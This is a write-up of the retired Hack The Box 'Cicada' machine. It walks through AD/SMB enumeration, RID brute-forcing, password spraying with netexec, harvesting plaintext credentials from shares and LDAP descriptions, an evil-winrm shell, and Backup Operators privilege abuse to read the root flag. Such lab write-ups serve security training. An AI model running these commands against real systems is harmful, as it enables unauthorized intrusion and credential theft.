This is a writeup for recently retired Cicada machine in Hackthebox platform.

### Part one: Scanning and Enumeration

Let’s begin with an nmap scan, so that we know which service are running and where to start.

```
nmap -Sv -Sc 10.10.11.27
```

![NMAP](/static/writeups/Cicada/0.png)

We can see many services are running and machine is using Active Directory service and there are many service to fiddle with. I am going to start with samba and enumerate shares using smbclient:

> smbclient -N -L $TAR, (TAR means target ip:TAR=10.10.11.35)

![NMAP](/static/writeups/Cicada/1.png)

let’s check if we can login with guest account or not, and if yes what permission we have using netexec:

> nxc smb 10.10.11.35 -u ‘a’ -p ‘’ — shares

![NMAP](/static/writeups/Cicada/2.png)

I can read HR and $IPC share, lets see HR contents using smbclient. there is a file called ‘Notice from Hr.txt’

![NMAP](/static/writeups/Cicada/3.png)

![NMAP](/static/writeups/Cicada/4.png)

It contains password for default user 'Cicada$M6Corpb\*@Lp#nZp!8' can be seen in this file, lets keep note of it.  
 Now with a password in hand, lets find some usernames so, we can use password we found earlier. As it is active directory we can Enumerate Users by Bruteforcing RID using Netexec:

> sudo nxc smb $TAR -u guest -p ‘’ — rid-brute

![NMAP](/static/writeups/Cicada/5.png)

We can find many user from this command, lets keep note of it. let’s use previously found password from ‘Notice from HR.txt’ and use these user to see if any username matches with password.  
 we can use netexec for this also.

> sudo nxc smb $TAR -u user.txt -p ‘Cicada$M6Corpb\*@Lp#nZp!8’ — continue-on-success

![NMAP](/static/writeups/Cicada/6.png)

We can see user ‘michael.wrightson’ matches with that pasword. lets use these credentials in Netexec to see what permission we have on share with this account.

> nxc smb 10.10.11.35 -u ‘michael.wrightson’ -p ‘Cicada$M6Corpb\*@Lp#nZp!8’ — shares

Nothing interesting same permission as guest account so, lets use ldapdomaindump using michael to find some more information.

> ldapdomaindump 10.10.11.35 -u ‘cicada\michael.wrightson’ -p ‘Cicada$M6Corpb\*@Lp#nZp!8’

![NMAP](/static/writeups/Cicada/7.png)

We find that David Orelius left his password in description: ‘aRt$Lp#7t\*VQ!3’. lets use the credentials in Netexec to see what permission we have on share with this account.

![NMAP](/static/writeups/Cicada/8.png)

david can access dev share lets see what is in there using smbclient

> smbclient -U david.orelious //$TAR/DEV

![NMAP](/static/writeups/Cicada/9.png)

there is file called backup_script.ps1 which contains emily.oscars password: ‘Q!3@Lp#M6b*7t*Vt’. Lets see what permission we have on share using these credentials using NetExec:

> nxc smb 10.10.11.35 -u ‘emily.oscars’ -p ‘Q!3@Lp#M6b*7t*Vt’ — shares

![NMAP](/static/writeups/Cicada/10.png)

emily can read all share except DEV and have write access in C$ share.

### Part Two: Finding Foothold

Accessing c$ share using emily account and pivoting here and there we can see that there is file called user.txt in Desktop folder ‘C:\Users\emily.oscars.cicada\Desktop’ from where we are able to get user flag.

Using evil-winrm with emily account, we are able to get shell in the machine.

> sudo evil-winrm -i $TAR -u emily.oscars -p ‘Q!3@Lp#M6b*7t*Vt’

![NMAP](/static/writeups/Cicada/11.png)

and using net user emily.oscars, we can see that emily is part of backup_operators group.

lets keep pivoting, file called root.txt can be found on Desktop folder under Administrator directory.

![NMAP](/static/writeups/Cicada/12.png)

But we cannot download or access that file with emily.

### Part Three: Privilege Escalation

As a built-in AD groups, **Backup operators** can log into a computer and shut it down. Can create backup of local files regardless of permission on that file. NTDS.DIT can be cloned.  
 lets look for a way to escalate privilege in order to read ‘root.txt’. by googling for a while i found a way to escalate privilege of emily.oscars [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges)

Using two dll called SeBackupPrivilegeUtils.dll and SeBackupPrivilegeCmdLets.dll, we are able to copy and access file that high level user like admin can access.

![NMAP](/static/writeups/Cicada/13.png)

We can download these file from internet and manually upload them in write access directory of emily.oscars and using the method above we can escalate privilege and copy it to directory with write permission using this command:

> Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt c:\\Users\emily.oscars.CICADA\Downloads\a.txt

![NMAP](/static/writeups/Cicada/14.png)

and we are able to get root flag like this:

![NMAP](/static/writeups/Cicada/15.png)

cheers!!

![NMAP](/static/writeups/Cicada/cicadaa.png)
